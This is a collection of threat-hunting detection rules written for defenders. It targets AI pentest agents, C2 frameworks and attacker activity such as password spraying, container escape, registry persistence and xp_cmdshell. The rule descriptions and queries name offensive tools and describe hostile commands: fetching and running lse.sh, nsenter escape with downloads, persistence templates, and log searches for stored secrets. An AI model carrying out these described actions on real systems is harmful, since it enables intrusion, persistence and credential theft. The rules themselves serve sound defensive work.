false_positives: An agreed credential test by your own red team with Agentic Bug Hunter
name: Agentic Bug Hunter Password Spray or Wordlist Crawl Started
query: (process.command_line:(*spray_orchestrator.sh* OR *_spray_http_form.py* OR *_spray_oauth.py*)) OR process.command_line:*Intel\ Mac\ OS\ X\ 10_15_7\)\ Bug\-Bounty\-Research*

author: ThreatDefence
description:
Detects files Pentest Harness (S1N6H/pentest-harness, a rebrand of the dsh agent harness) writes in its home folder
~/.dsh (or $DSH_HOME): the managed model-key store .credentials.yaml, the anonymous telemetry id .anonymous-user-id,
the settings document settings.yaml and the session logs sessions/<project>/<id>/session.jsonl (.jsonl.zstd when
compressed), and the install of its Landlock launcher package @pentest-harness/node-addon-landlock-run-<platform>.
The home folder layout comes from the upstream dsh harness, so those branches also match it and its forks.
false_positives: Authorized use of Pentest Harness
The upstream dsh harness or another fork (home folder branches)
name: Pentest Harness Home Folder Files Written
query: (TargetFilename:*\/.dsh\/* AND (TargetFilename:(*\/.dsh\/.credentials.yaml OR *\/.dsh\/.anonymous\-user\-id OR *\/.dsh\/settings.yaml OR *\/session.jsonl OR *\/session.jsonl.zstd))) OR (TargetFilename:*\\.dsh\\* AND (TargetFilename:(*\\.dsh\\.credentials.yaml OR *\\.dsh\\.anonymous\-user\-id OR *\\.dsh\\settings.yaml OR *\\session.jsonl OR *\\session.jsonl.zstd))) OR TargetFilename:*@pentest\-harness\/node\-addon\-landlock\-run\-*

author: ThreatDefence
description:
Detects lookups of dalfox-xss-test.com, the blind XSS callback Cyber-AutoAgent's general module gives dalfox. A
lookup from a browser or server you own means a stored payload ran there.
false_positives: Authorized tests with Cyber-AutoAgent
name: Cyber-AutoAgent Dalfox Blind XSS Callback DNS Query
query: dns.question.name:/[dD][aA][lL][fF][oO][xX]-[xX][sS][sS]-[tT][eE][sS][tT]\.[cC][oO][mM]/ OR dns.question.name:/.*\.[dD][aA][lL][fF][oO][xX]-[xX][sS][sS]-[tT][eE][sS][tT]\.[cC][oO][mM]/

author: ThreatDefence
description:
Detects the NyxStrike tool server (nyxstrike_server.py), its MCP client (nyxstrike_mcp.py), its launcher
(nyxstrike.sh) and its virtual environment (nyxstrike-env), and every tool the server starts: the server runs each
tool through /bin/sh -c with itself as the parent. NyxStrike is a HexStrike derivative that exposes about 200
offensive tools to an AI assistant or its own LLM agents.
false_positives: Authorized red team or lab use of NyxStrike
name: NyxStrike Server, MCP Client or Tool Started by the Server
query: (process.command_line:(*nyxstrike_server.py* OR *nyxstrike_mcp.py* OR *nyxstrike.sh* OR *\/nyxstrike\-env\/bin\/python*)) OR process.parent.command_line:*nyxstrike_server.py*

author: ThreatDefence
description:
Detects the research PentestAgent (nbshenxm/pentest-agent, arXiv 2411.05185) running: its recon, planning and
execution scripts, and the exact cvemap and searchsploit command lines its planning agent builds. The recon and
execution agents run every command the model returns through /bin/sh -c, so look at the children of the matched
python process. Not the GH05TCREW/pentestagent tool, which has its own folder.
false_positives: Researchers reproducing the PentestAgent paper or running it in a lab
Other projects with scripts named agents/recon_agent.py
name: PentestAgent (Paper Code) Agents, cvemap or searchsploit Run on a Host
query: (process.command_line:(*agents\/recon_agent.py* OR *agents\/planning_agent.py* OR *agents\/execution_agent.py*)) OR (process.command_line:*cvemap\ * AND process.command_line:*\ \-l\ 50\ * AND process.command_line:*\ \-offset\ * AND process.command_line:*\ \-j*) OR (process.command_line:*\|\ cvemap\ \-json\ \>\ * AND process.command_line:*\/info\/cvemap.json*) OR (process.command_line:*searchsploit\ * AND process.command_line:*\ \-j\ \>\ resources\/* AND process.command_line:*\/exploitdb.json*)

author: ThreatDefence
description:
Detects one of Mitsu's Red Team Armory tools started directly by the Mitsu Python process. Each Armory MCP tool
runs its executable without a shell, with the model's arguments, no standard input and a timeout of 120 seconds
by default (600 at most), so the scanner's parent is the mitsu process itself rather than a shell. The list
below is the part of Mitsu's 165-tool catalog that sends traffic to a target. Mitsu's vulnerability search also
runs searchsploit --json <query> and vulnx search <query> --limit 8 --json --silent the same way.
false_positives: Authorized tests, CTF and lab work with Mitsu
name: Offensive Tool Started Directly by Mitsu
query: (process.executable:(*\/nmap OR *\/masscan OR *\/rustscan OR *\/naabu OR *\/httpx OR *\/nuclei OR *\/nikto OR *\/sqlmap OR *\/ffuf OR *\/feroxbuster OR *\/gobuster OR *\/dirsearch OR *\/wpscan OR *\/whatweb OR *\/wafw00f OR *\/dalfox OR *\/commix OR *\/hydra OR *\/medusa OR *\/ncrack OR *\/netexec OR *\/nxc OR *\/kerbrute OR *\/certipy OR *\/evil\-winrm OR *\/msfconsole OR *\/searchsploit OR *\/vulnx OR *\/subfinder OR *\/amass OR *\/katana OR *\/testssl)) AND ((process.parent.command_line:(*\/bin\/mitsu OR *\ \-m\ mitsu)) OR process.parent.command_line:*\/uv\/tools\/mitsu\/*)

author: ThreatDefence
description:
Detects FilterLogEvents calls whose filter pattern searches for passwords or AWS access keys.
Datadog saw a stolen key search CloudWatch logs with patterns such as ?password ?AKIA, always with a
limit of 1000.
false_positives: Engineers searching logs for leaked secrets during a cleanup
name: CloudWatch Logs Searched for Secrets
query: (event.provider:logs.amazonaws.com AND event.action:FilterLogEvents) AND (aws.cloudtrail.request_parameters:(*password* OR *AKIA* OR *secret* OR *token*))

author: ThreatDefence
description: A process or file carries the names ARTEX agents give their own test artifacts.
name: ARTEX Artifact Names on a Host
query:
any where
  (event.category == "process" and process.command_line : ("*artex-probe-*", "*ArtexProbe*", "*artx5v*", "*art18-*", "*ARTEX_WRITE_PROBE*", "*ARTX_PERSIST_OK*")) or
  (event.category == "file" and (file.name : "artex-probe-*" or file.path : "*ProgramData*artx5v*" or
     file.name in ("cl1217.jsp", "f1219a.jsp", "z1219.jsp", "zzartx0000.php")))

author: ThreatDefence
description:
Detects canaries that 0security's built-in playbooks and skills give its agent as examples: osec123xss as an
XSS reflection marker and ZERO-INJ-OK as a prompt-injection marker in a query string, and the HTTP method ZERO,
one of the non-standard verbs its auth-bypass playbook suggests. They are examples in the prompt, so the model
may use other strings. The `0 probe` prompts go in POST bodies, which web logs do not record; see the Suricata
rules for those.
false_positives: Authorized tests with 0security
name: 0security Playbook Canary or Bogus Method in Web Logs
query: (url.query:(*osec123xss* OR *ZERO\-INJ\-OK*)) OR cs-method:ZERO

author: ThreatDefence
description:
Detects files written by the KaliGPT installer and agent. install.sh downloads kaligptinstaller.sh into the current
folder; the installer (run with sudo) clones KaliGPT into /opt/KaliGPT and SudoHopeX/OpenSearchAPI into
/opt/KaliGPT/OpenSearchAPI, creates the virtual environment /opt/KaliGPT/its_venv, writes the launchers
/usr/local/bin/kaligpt and /usr/local/bin/opensearchapi, and makes /opt/KaliGPT/agents/utils/api.config.json
(provider API keys in clear text) world-writable (chmod 666). On Termux the paths are
/data/data/com.termux/files/usr/share/KaliGPT and /data/data/com.termux/files/usr/bin/kaligpt.
false_positives: Authorized tests, CTF and lab work with KaliGPT
name: KaliGPT Installed or Configured
query: (TargetFilename:(*\/opt\/KaliGPT\/* OR *\/share\/KaliGPT\/*)) OR (TargetFilename:(*\/bin\/kaligpt OR *\/bin\/opensearchapi)) OR TargetFilename:*\/kaligptinstaller.sh

author: ThreatDefence
description:
Detects strings DarkMoon's agent prompts put in requests: the user agent dm-edge (the edge-proxy agent's first
request, curl -sSI -A dm-edge), the cache buster dmcb=DM1 of its cache poisoning test, and a container registry
manifest tagged darkmoon-proof-<random> when it proves it can push images. The model usually copies these
commands from the prompt but may change them.
false_positives: Authorized tests with DarkMoon
name: DarkMoon Probe Markers in Web Server Logs
query: user_agent.original:dm\-edge OR url.query:*dmcb\=DM1* OR url.path:*\/manifests\/darkmoon\-proof\-*

author: ThreatDefence
description:
Detects the Shannon CLI started with --exp-php2shell. The probe sends a control request and up to two multipart
bodies of about 1 MiB and 7.4 MiB, flooded with MIME headers, to one URL. It is designed to crash a PHP worker on an
unpatched runtime (CVE-2026-109618 as the Shannon source names it) and runs from the CLI, without Docker.
false_positives: Administrators checking their own PHP servers after the php2shell fixes
name: Shannon Experimental php2shell Crash Probe Started
query: process.command_line:*\-\-exp\-php2shell* AND process.command_line:*shannon*

author: ThreatDefence
description:
Detects lookups of update.pentagi.com and support.pentagi.com. Every PentAGI installation checks for updates every
three hours by default, so a hit shows where PentAGI runs.
false_positives: Approved PentAGI deployments
name: DNS Query for the PentAGI Update Service
query: dns.question.name:/[uU][pP][dD][aA][tT][eE]\.[pP][eE][nN][tT][aA][gG][iI]\.[cC][oO][mM]/ OR dns.question.name:/[sS][uU][pP][pP][oO][rR][tT]\.[pP][eE][nN][tT][aA][gG][iI]\.[cC][oO][mM]/

author: ThreatDefence
description:
Detects files that Cybermes, a Hermes Agent based AI pentest framework (Zyrexnn/Cybermes at 149b9a66), writes: the
npm launcher's cache of the cybermes-mcp binary and its settings in ~/.cybermes/, Cybermes' auto-loaded skill
autonomous-godmode-hunter copied into the Hermes home (.hermes/skills/), the raw tool output the MCP server keeps
under recon/<target_slug>/ (katana.txt, nuclei_output.txt), and the per-target report folder layout
reports/<target_slug>/evidence/recon_notes.md and REPORT_<target_slug>.pdf.
false_positives: Authorized security testers who run Cybermes
Other tools that keep katana or nuclei output in a recon/ folder
name: Cybermes Files Written
query: (TargetFilename:(*\/.cybermes\/bin\/cybermes\-mcp\-v* OR *\\.cybermes\\bin\\cybermes\-mcp\-v* OR *\/.cybermes\/update_check.json* OR *\\.cybermes\\update_check.json*)) OR (TargetFilename:(*\/.hermes\/skills\/autonomous\-godmode\-hunter\/* OR *\\.hermes\\skills\\autonomous\-godmode\-hunter\\*)) OR (TargetFilename:*\/recon\/* AND (TargetFilename:(*\/katana.txt OR *\/nuclei_output.txt))) OR (TargetFilename:*\/reports\/* AND (TargetFilename:*\/evidence\/recon_notes.md OR (TargetFilename:*\/REPORT_* AND TargetFilename:*.pdf)))

author: ThreatDefence
description:
Detects Mitsu, an AI pentest agent, reading a page on your web server with its web_search tool. The tool sends
"Mitsu/0.1 (terminal assistant; public search)" with Accept "text/html,text/plain,application/json,
application/xml,*/*;q=0.5", follows redirects to HTTP and HTTPS only, and reads at most 1,000,000 bytes. Mitsu's
system prompt tells the model to open every URL the operator supplies with this tool before using curl or wget,
so it is often the first request of an engagement. Scans run through Armory tools (nmap, nuclei, ffuf and others)
carry those tools' own user agents, not this one.
false_positives: Authorized tests, CTF and lab work with Mitsu
name: Mitsu Page Fetch User Agent in Web Logs
query: user_agent.original:"Mitsu\/0.1 \(terminal assistant; public search\)"

author: ThreatDefence
description:
Detects the first step of the hackingBuddyGPT use-case ExPrivEscLinuxLSE on the target it reached over SSH: it
downloads linux-smart-enumeration with wget -q '<github release url>/lse.sh' -O lse.sh, makes it executable and runs
./lse.sh -c -i -l 0, then asks the model for privilege escalation ideas from the output. Others run lse.sh too;
the exact download and flag combination is the code's.
false_positives: An administrator or tester who downloads and runs lse.sh with the same flags
name: hackingBuddyGPT lse.sh Enumeration on a Linux Target
query: (process.command_line:*linux\-smart\-enumeration\/releases\/latest\/download\/lse.sh* AND process.command_line:*\-O\ lse.sh*) OR process.command_line:*lse.sh\ \-c\ \-i\ \-l\ 0*

author: ThreatDefence
description:
Detects an MCP client driving a remote Hexstrike-redteam server's BOAZ routes: /api/boaz/generate-payload,
/api/boaz/list-loaders, /api/boaz/list-encoders, /api/boaz/analyze-binary or /api/boaz/validate-options.
false_positives: Authorized tests with Hexstrike-redteam
name: Hexstrike-redteam BOAZ API Requested Through a Proxy
query: url.original:(*\/api\/boaz\/generate\-payload* OR *\/api\/boaz\/list\-loaders* OR *\/api\/boaz\/list\-encoders* OR *\/api\/boaz\/analyze\-binary* OR *\/api\/boaz\/validate\-options*)

author: ThreatDefence
description:
Detects files PentestAgent by GH05TCREW writes: its token counter loot/token_usage.json, the named pipes of a child
agent (/tmp/pa_mcp_<random>/mcp_in.fifo and mcp_out.fifo), the PID file of its detached MCP manager
(~/.pentestagent/mcp.pid) and its TUI reports (loot/reports/report_<timestamp>.md). loot/notes.json is written too
but is a common name, so it only counts here next to token_usage.json in a hunt.
false_positives: Bug bounty hunters, red teams and security teams running PentestAgent
name: PentestAgent (GH05TCREW) Loot, Child Agent Pipes or Daemon PID File Written
query: TargetFilename:*\/loot\/token_usage.json OR (TargetFilename:*\/pa_mcp_* AND (TargetFilename:(*\/mcp_in.fifo OR *\/mcp_out.fifo))) OR TargetFilename:*\/.pentestagent\/mcp.pid OR (TargetFilename:*\/loot\/reports\/report_* AND TargetFilename:*.md)

author: ThreatDefence
description:
Detects files BreachWeave writes on the host that runs it: ~/.tch-agent/config (auth.json, models.json,
provider-prefs.json, settings.json, users.json on the pentest branch), ~/.tch-agent/solvers/<id> and
archive_solvers (startup.json, session, workspace), ~/.tch-agent/challenge, the compiled Linux solver binary in
~/.tch-agent/runtime/self/, the marker file its solver image writes, and the .tch-networks-output folder of the
tch-headless crawler its skill drives.
false_positives: Red teams, CTF teams and researchers running BreachWeave
name: BreachWeave (tch-agent) Home Folder, Solver State or Crawler Output Written
query: (TargetFilename:(*\/.tch\-agent\/config\/* OR *\/.tch\-agent\/solvers\/* OR *\/.tch\-agent\/archive_solvers\/* OR *\/.tch\-agent\/challenge\/* OR *\/.tch\-agent\/runtime\/* OR *\\.tch\-agent\\config\\* OR *\\.tch\-agent\\solvers\\*)) OR TargetFilename:*\/THIS_IS_DOCKER_CONTAINER_NOT_TARGET_MACHINE.txt OR TargetFilename:*\/.tch\-networks\-output\/*

author: ThreatDefence
description:
Detects Windows command lines that PentestCode's os_hook tool gives its post-exploitation agents as templates: a
scheduled task named UpdateCheck at logon as SYSTEM, a Run key value named Update, a firewall rule named Allow, and a
DNS lookup of the domain controller SRV record through %USERDNSDOMAIN%. The agent fills in the payload path and port.
false_positives: Administrators who use the same names (a task UpdateCheck or a Run value Update is not rare); review the target path
name: PentestCode os_hook Persistence and Discovery Command Templates on Windows
query: (process.command_line:*\/create* AND process.command_line:*\/tn\ \"UpdateCheck\"* AND process.command_line:*\/sc\ onlogon* AND process.command_line:*\/ru\ SYSTEM*) OR (process.command_line:*\\CurrentVersion\\Run* AND process.command_line:*\/v\ Update\ * AND process.command_line:*\/t\ REG_SZ*) OR (process.command_line:*advfirewall\ firewall\ add\ rule* AND process.command_line:*name\=\"Allow\"* AND process.command_line:*dir\=in\ action\=allow*) OR process.command_line:*_ldap._tcp.dc._msdcs.%USERDNSDOMAIN%*

author: ThreatDefence
description:
Detects a tool started by one of MCP for Security's wrappers (node <dir>/<tool>-mcp/build/index.js) with the fixed
argument shapes the wrappers build: nuclei/httpx/katana -u ... -silent, scout aws --force --no-browser,
assetfinder -subs-only, gowitness scan single --url / scan file -f, shuffledns -d ... -mode, masscan -p<ports>,
commix.py and smuggler.py -u, and any nmap, sqlmap, ffuf, wpscan, sslscan, arjun, amass, alterx, cero or
waybackurls run under a wrapper. The AI assistant in the MCP host chose the target and options.
false_positives: Other MCP servers laid out as <name>-mcp/build/index.js that run the same tools
Authorized tests driven through MCP for Security
name: Recon or Exploitation Tool Started by an MCP for Security Wrapper
query: (process.parent.command_line:(*\-mcp\/build\/index.js* OR *\/cero\/build\/index.js*)) AND ((process.command_line:(*\ \-silent* OR *aws\ \-\-force\ \-\-no\-browser* OR *\ \-subs\-only\ * OR *scan\ single\ \-\-url\ * OR *scan\ file\ \-f\ * OR *\/opt\/commix\/commix.py\ \-u\ * OR *\/opt\/smuggler\/smuggler.py\ \-u\ * OR *sqlmap\ \-u\ * OR *sqlmap.py\ \-u\ * OR *wpscan\ \-u\ *)) OR (process.executable:(*\/nmap OR *\/masscan OR *\/nuclei OR *\/httpx OR *\/katana OR *\/ffuf OR *\/sqlmap OR *\/wpscan OR *\/sslscan OR *\/arjun OR *\/amass OR *\/alterx OR *\/assetfinder OR *\/cero OR *\/shuffledns OR *\/gowitness OR *\/waybackurls OR *\/scout)))

author: ThreatDefence
description:
Detects files CHYing-agent writes on the operator's host or in its tools container: the per-target work folder
agent-work/ctf/<Category>/<challenge>/ with findings.log, attack_timeline.md, progress.md, dumps/commands.log and
poc_scripts/poc_<time>.py, its SQLite database data/chying.db, its run logs logs/chying_agent_<time>.log, and the
data folder ~/.taie/null-zone/ of its Null Zone contest skills.
false_positives: Security teams and contest players running CHYing-agent
name: CHYing-agent Work Folder, Database or Log Files Written
query: (TargetFilename:*\/agent\-work\/ctf\/* AND (TargetFilename:(*\/findings.log OR *\/attack_timeline.md OR *\/dumps\/commands.log OR *\/dumps\/execution_summary.md OR *\/dumps\/reflection_history.md))) OR ((TargetFilename:*\/agent\-work\/ctf\/* AND TargetFilename:*\/poc_scripts\/poc_*) AND TargetFilename:*.py) OR TargetFilename:*\/data\/chying.db OR (TargetFilename:*\/logs\/chying_agent_* AND TargetFilename:*.log) OR TargetFilename:*\/.taie\/null\-zone\/*

author: ThreatDefence
description:
Detects the Incalmo C2 server (incalmo/c2server/c2server.py), its Celery worker and beat (incalmo.c2server.celery.celery_worker),
and the Metasploit RPC daemon its attacker container starts with the fixed password "password". The C2 server listens on
0.0.0.0:8888 with no authentication and hands shell commands to Caldera Sandcat implants on compromised hosts.
false_positives: Research or red team use of Incalmo in a lab
Other setups that start msfrpcd with the password "password"
name: Incalmo C2 Server or Its Celery Worker
query: (process.command_line:(*incalmo\/c2server\/c2server.py* OR *incalmo.c2server.celery.celery_worker*)) OR (process.command_line:*msfrpcd* AND process.command_line:*\-P\ password*)

author: ThreatDefence
description: Failed sign-ins for 20 or more distinct accounts from one address in 30 minutes. Storm-0940 sprayed 327 accounts at a fixed one-second rhythm. The native KQL and SPL hunts also test the rhythm.
false_positives: Automation and infrastructure-as-code pipelines. Baseline before alerting
name: Password Spray Against Many Entra ID Accounts From One Address

author: ThreatDefence
description: Detects HexStrike's hard-coded user agents and the <hexstrikeXSSTest123> reflection probe its browser agent submits.
false_positives: Authorized tests with HexStrike
name: HexStrike User Agent or XSS Probe in Web Logs
query: (user_agent.original:(*HexStrike\-HTTP\-Framework\/* OR *HexStrike\-BrowserAgent\/* OR *Mozilla\/5.0\ \(Compatible\ Exploit\)*)) OR url.query:*hexstrikeXSSTest123*

author: ThreatDefence
description:
Detects Carbonato's escape from a privileged container into the host (nsenter -t 1 -m -u -n -i), its worm container
names and image, and its persistence paths. Carbonato installs Hermes Agent with a GH0ST persona on each host.
false_positives: Node maintenance scripts that enter the host namespaces and download or schedule something
name: Carbonato Docker Worm Host Escape or Persistence
query: ((process.command_line:*nsenter* AND process.command_line:*\-t\ 1* AND process.command_line:*\-m\ \-u\ \-n\ \-i*) AND (process.command_line:(*curl\ * OR *wget\ * OR *crontab* OR *chattr* OR *authorized_keys* OR *systemctl\ enable* OR *rc.local* OR *.hermes*))) OR (process.command_line:(*netns\-probe* OR *system\/resolved* OR *.docker\-network\-monitor* OR *\/opt\/gh0st\/* OR *CARBONATO_API_KEY*)) OR process.executable:\/usr\/sbin\/systemd\-logind

author: ThreatDefence
description: Detects Okta events whose raw user agent names ARTEX.
false_positives: Authorized penetration tests that use ARTEX
name: ARTEX User Agent in Okta System Log
query: client.userAgent.rawUserAgent:(*artex\-readonly\/* OR *artex\-pentest\/* OR *artex\-audit\/* OR *artex\-verify\/* OR *artex\-spawn\/* OR *ARTEX\-worker\/* OR *artex\-enrich\/* OR *artex\-i21861\-canary* OR *artex\-agent* OR *artex\-judge\-* OR *ARTeX\-authorized\-pentest* OR *Mozilla\/5.0\ ARTeX* OR *Mozilla\/5.0\ \(ARTEX\)* OR *ArtExVerify\/* OR *ArtEx\/1.0* OR *scopeweaver* OR *spa\-api\-recon*)

author: ThreatDefence
description:
Detects commands Nebula (BerylliumSec/nebula) runs for its agents and operator terminals: the Python wrapper it
passes to docker or podman exec, which records the process group in /tmp/nebula-process-<id>.pid and execs
/bin/bash --noprofile --norc -c <command>; its container names nebula-runtime-, nebula-terminal- and nebula-exec-;
its locally built image localhost/nebula-kali-headless; and the entrypoint and address check inside that image.
false_positives: Penetration testers and security teams running Nebula
name: Nebula Agent Command in Its Kali Container
query: process.command_line:*os.execv\('\/bin\/bash',\['\/bin\/bash','\-\-noprofile','\-\-norc','\-c',sys.argv\[2\]\]\)* OR process.command_line:*\/tmp\/nebula\-process\-* OR ((process.executable:(*\/docker OR *\/podman)) AND (process.command_line:(*\ nebula\-runtime\-* OR *\-\-name\=nebula\-runtime\-* OR *\-\-name\=nebula\-terminal\-* OR *\-\-name\=nebula\-exec\-* OR *localhost\/nebula\-kali\-headless*))) OR (process.command_line:(*\/usr\/local\/bin\/nebula\-terminal\-entrypoint* OR *\/usr\/local\/lib\/nebula\-public\-ip\-update*))

author: ThreatDefence
description:
Detects an app role or directory role assigned to a service principal. ARTEX agents in the
Storm-0940 campaign had compromised applications grant themselves roles. Investigate when the
initiator is the same service principal that receives the role.
false_positives: Administrators granting application permissions
name: App Role or Directory Role Assigned to a Service Principal
query: azure.auditlogs.operation_name:("Add app role assignment to service principal" OR "Add member to role")

author: ThreatDefence
description:
Detects a scanner or attack tool started directly by the Python process of Guardian (zakirkun/guardian-cli), an
AI pentest CLI. Each tool wrapper builds an argument list and starts it with asyncio.create_subprocess_exec, with
no shell, so the tool's parent is Guardian itself. Defaults include "nmap -sV -sC -T4 -oX - <target>",
"nuclei -u <url> -jsonl ... -silent -rate-limit ...", "httpx -json ...", "ffuf -u <url>/FUZZ -w <list> -json ...
-s" and "sqlmap -u <url> --batch --parse-errors ... --random-agent". prompt_fuzz, zap_api, burp_api and mobsf
start curl.
false_positives: Authorized tests with Guardian
Another Python project with a cli/main.py module that runs these tools
name: Scanner Started Directly by Guardian
query: (process.executable:(*\/nmap OR *\/masscan OR *\/httpx OR *\/subfinder OR *\/amass OR *\/nuclei OR *\/nikto OR *\/sqlmap OR *\/ffuf OR *\/gobuster OR *\/wpscan OR *\/whatweb OR *\/wafw00f OR *\/arjun OR *\/xsstrike OR *\/cmseek OR *\/dnsrecon OR *\/testssl OR *\/testssl.sh OR *\/sslyze OR *\/kerbrute OR *\/crackmapexec OR *\/nxc OR *\/theHarvester OR *\/schemathesis OR *\/curl)) AND (process.parent.command_line:(*\ \-m\ cli.main\ * OR *\/bin\/guardian\ *))

author: ThreatDefence
description:
Detects sqlservr.exe starting cmd.exe or PowerShell, the result of xp_cmdshell. The SQL Server toolkit seen in
ARTEX operations enables xp_cmdshell after brute-forcing the sa login, then downloads its loader.
false_positives: Database jobs that use xp_cmdshell by design. Baseline per server
name: SQL Server Spawns a Shell Through xp_cmdshell
query: process.parent.executable.caseless:*\\sqlservr.exe AND (process.executable.caseless:(*\\cmd.exe OR *\\powershell.exe OR *\\pwsh.exe OR *\\certutil.exe OR *\\bitsadmin.exe))

author: ThreatDefence
description:
Detects files the Virga C2 framework writes on the operator host: the server's extension store under
/tmp/virga/extensions, its SQLite database data/virga.db, the CLI history .virga_history, the CLI JSONL log
logs/virga-<datetime>.jsonl, the generator's temporary folder virga-generator-<random>, and the local model the
beacons carry, internal/implant/llama/models/model.gguf.
false_positives: Red teams and researchers running Virga
Another application that names its database virga.db
name: Virga Server, Generator or Model Files Written
query: TargetFilename:\/tmp\/virga\/extensions\/* OR (TargetFilename:(*\/data\/virga.db OR *\/.virga_history OR *\/internal\/implant\/llama\/models\/model.gguf OR *\\internal\\implant\\llama\\models\\model.gguf)) OR (TargetFilename:(*\/virga\-generator\-* OR *\\virga\-generator\-*)) OR (TargetFilename:*\/logs\/virga\-* AND TargetFilename:*.jsonl)

author: ThreatDefence
description:
Detects fixed probe values from the prompts of Pentest Agent Suite (H-mmer/pentest-agents at 41d49b64), a bug bounty
framework of agents, skills and rules that a coding assistant (Claude Code, Codex, Gemini, Cursor, Windsurf, Copilot,
OpenClaw) runs with curl: the out-of-band placeholder hosts c.oast.fun and x.oast.fun in its XSS, command injection
and Log4Shell payloads, the XSS rotation-ladder marker XSS-AAB123, the browser-verifier element xss-verified, the
/autopilot response-splitting value Set-Cookie:%20pwn=1, its open redirect values pointing at evil.tld, and the
/hunt reflection parameter testparam=xss<unix time>. The model writes these requests from the prompt text and can
change any value on a given run.
false_positives: Authorized bug bounty or penetration tests with Pentest Agent Suite
Other testers who copy the same public payload examples
name: Pentest Agent Suite Probe Markers in Web Logs
query: (url.query:(*\/\/c.oast.fun* OR *%2F%2Fc.oast.fun* OR *\/\/x.oast.fun* OR *%2F%2Fx.oast.fun* OR *.x.oast.fun*)) OR (url.query:(*XSS\-AAB123* OR *xss\-verified* OR *Set\-Cookie\:%20pwn\=1* OR *testparam\=xss*)) OR (url.query:(*\=\/\/evil.tld* OR *\=%2F%2Fevil.tld* OR *\=\/%2F\/evil.tld* OR *@evil.tld* OR *Location\:%20\/\/evil.tld*))

author: ThreatDefence
description:
Detects an image pushed to a container registry under a repository named after an attack agent or a write test:
artex-i<issue id>, hermes-h<id>-writecheck, csai-push-probe, xalgorix-pwn, the gh0st/ and fsociety/ namespaces, or
names that hold writecheck, push-probe or pwned. Agents that find a registry open to pushes prove it by pushing a
small image, and they name it after themselves. Open registries on the internet carry these names by the hundred.
A push can be followed by a poisoned copy of one of your own images, so check what else that source pushed.
false_positives: Security teams testing their own registry
A project of your own with one of these words in its name
name: Attack Agent Write Test on a Container Registry
query: (cs-method:PUT AND url.path:\/v2\/* AND url.path:*\/manifests\/*) AND ((url.path:(*writecheck* OR *write\-check* OR *push\-probe* OR *push\-poc* OR *push\-test* OR *pwned* OR *hijack\-canary* OR *regscan\-probe* OR *probe\-write\-test* OR *\/gh0st\/* OR *\/gh0st\-* OR *\/fsociety\/* OR *\/csai\-* OR *\/cyberstrike\-probe* OR *\/xalgorix\-*)) OR url.path:/.*\/(artex[-_](i[0-9]|probe|push|poc|rce|test|exploit|retest)|ptx-i[0-9]|hermes-h[0-9]).*/)

author: ThreatDefence
description:
Detects a Run value named SystemUpdate, which the CyberStrikeAI implant writes under
HKCU\Software\Microsoft\Windows\CurrentVersion\Run to start at logon.
false_positives: Software that really names its Run value SystemUpdate
name: CyberStrikeAI Implant Run Key Value SystemUpdate
query: registry.path:*\\CurrentVersion\\Run\\SystemUpdate

author: ThreatDefence
description:
Detects a Run value named NSUpdate, which NeuroSploit's C2 writes under HKCU\Software\Microsoft\Windows\CurrentVersion\Run
to start its PowerShell beacon at logon.
false_positives: Software that really names its Run value NSUpdate
name: NeuroSploit Beacon Run Key Value NSUpdate
query: registry.path:*\\CurrentVersion\\Run\\NSUpdate

author: ThreatDefence
description:
Detects a host on your network running the playwright_screenshot tool of Guardian (zakirkun/guardian-cli), an AI
pentest CLI. Headless Chromium loads each target URL, and every resource on the page, with the user agent
"Guardian-CLI/4 (security testing; +authorized engagement)". Most targets are HTTPS, so a proxy sees the user agent
only with TLS inspection; the destination host is still logged.
false_positives: Authorized tests with Guardian
name: Guardian Screenshot User Agent in Proxy Logs
query: user_agent.original:"Guardian\-CLI\/4 \(security testing; \+authorized engagement\)"

author: ThreatDefence
description:
Detects the fixed payload markers of PentestCode's inject_probe tool, which sends up to 120 payloads per run into
query, form, JSON and cookie parameters: the tag <pctsttag> (XSS), echo pctstcmd (command injection) and the
template expressions built on 7919*6841 (SSTI). Also its own user agent. Cookie injections are covered by the
Suricata rules only, since most web logs do not record cookies.
false_positives: Authorized tests with PentestCode
name: PentestCode inject_probe Markers in Web Logs
query: (url.query:(*pctsttag* OR *pctstcmd* OR *7919\*6841*)) OR user_agent.original:pentestcode*

author: ThreatDefence
description:
Detects requests from the discovery phase of hackingBuddyGPT's WebAPITesting use-case. In its query step the code
appends one parameter from a fixed table, including the placeholders api_key=YourAPIKeyHere and
access_token=YourAccessToken. Its list of common API paths has a missing comma that joins two entries, so it also
requests /products/1/users/profile. Requests carry Python requests' default user agent.
false_positives: Developers testing an API with the same placeholder values copied from documentation
An application that really has a /products/<id>/users/profile route
name: hackingBuddyGPT Web API Discovery Values in Web Logs
query: (url.query:(*api_key\=YourAPIKeyHere* OR *access_token\=YourAccessToken*)) OR url.path:*\/products\/1\/users\/profile*

author: ThreatDefence
description:
Detects a value written under HKLM\SOFTWARE\EmulationMarkers\, where Cyber-AutoAgent's threat_emulation module
tells the model to record each technique it runs. The key comes from the prompt, so the model may vary it.
false_positives: Authorized adversary emulation with Cyber-AutoAgent
name: Cyber-AutoAgent Threat Emulation Marker Registry Key
query: registry.path:*\\SOFTWARE\\EmulationMarkers\\*

author: ThreatDefence
description:
Detects the user agent PentestAgent by GH05TCREW sets on its headless Chromium: the Chrome string cut off after
AppleWebKit/537.36, which no real browser sends. The CyberStrikeAI implant and an Xalgorix curl example use the same
string, so match the whole value and look at what else the address sent before attributing it.
false_positives: CyberStrikeAI implants and other tools that send the same truncated string
Authorized tests with PentestAgent
name: PentestAgent (GH05TCREW) Browser Tool User Agent in Web Logs
query: user_agent.original:("Mozilla\/5.0 \(Windows NT 10.0; Win64; x64\) AppleWebKit\/537.36" OR Mozilla\/5.0\+\(Windows\+NT\+10.0;\+Win64;\+x64\)\+AppleWebKit\/537.36)

author: ThreatDefence
description:
Detects the Virga command and control framework running on a host: its server (virga-server, which opens an
unauthenticated admin API and MCP servers on 8443, 8444 and 50012), its operator CLI (virga-cli), its MCP stdio
server (virga-mcp-stdio), the make targets that start them, and the MCP Inspector scripts that point at them.
Virga's beacon can carry a local language model that runs commands on the compromised host by itself.
false_positives: Red teams and researchers running Virga
name: Virga C2 Server, Operator CLI or MCP Server Started
